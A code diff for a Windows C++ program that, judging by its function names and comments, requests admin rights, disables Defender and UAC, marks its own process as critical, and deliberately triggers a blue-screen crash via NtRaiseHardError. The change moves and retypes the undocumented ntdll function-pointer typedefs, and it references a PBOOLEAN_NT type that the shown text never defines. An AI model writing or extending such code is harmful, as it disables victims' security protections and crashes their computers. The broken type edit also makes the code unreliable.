@@ -30,6 +30,13 @@ void DoBSOD();
 DWORD WINAPI MonitorThread(LPVOID);
 void RequestAdmin();
 
+// Define NTSTATUS and necessary types
+typedef LONG NTSTATUS;
+typedef BOOLEAN BOOLEAN_NT; // just in case
+
+typedef NTSTATUS (__stdcall *pRtlSetProcessIsCritical)(BOOLEAN_NT, PBOOLEAN_NT, BOOLEAN_NT);
+typedef NTSTATUS (__stdcall *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
+
 int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow)
 {
     RequestAdmin();
@@ -201,9 +208,6 @@ void DisableDefenderAndUAC()
     }
 }
 
-typedef NTSTATUS (WINAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
-typedef NTSTATUS (WINAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
-
 // Makes the current process critical — terminating it will cause a BSOD
 void MakeProcessCritical(BOOL critical)
 {
@@ -212,7 +216,7 @@ void MakeProcessCritical(BOOL critical)
         pRtlSetProcessIsCritical RtlSetProcessIsCritical =
             (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
         if (RtlSetProcessIsCritical) {
-            BOOLEAN tmp;
+            BOOLEAN_NT tmp;
             RtlSetProcessIsCritical(critical ? 1 : 0, &tmp, 0);
         }
     }
@@ -229,7 +233,7 @@ void DoBSOD()
             (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
 
         if (RtlSetProcessIsCritical) {
-            BOOLEAN tmp;
+            BOOLEAN_NT tmp;
             RtlSetProcessIsCritical(0, &tmp, 0);
         }
 
